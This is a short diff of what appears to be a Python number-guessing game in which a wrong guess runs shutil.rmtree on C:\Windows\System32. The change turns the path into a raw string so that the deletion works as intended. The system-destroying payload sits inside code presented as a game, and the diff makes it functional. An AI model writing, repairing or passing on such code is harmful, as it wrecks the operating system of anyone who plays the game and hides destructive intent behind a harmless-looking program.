@@ -7,4 +7,4 @@ guess = int(input("Guess a number from 1 - 10!"))
 if guess == number:
     print("You won!")
 else:
-    shutil.rmtree("C:\Windows\System32")
+    shutil.rmtree(r"C:\Windows\System32")
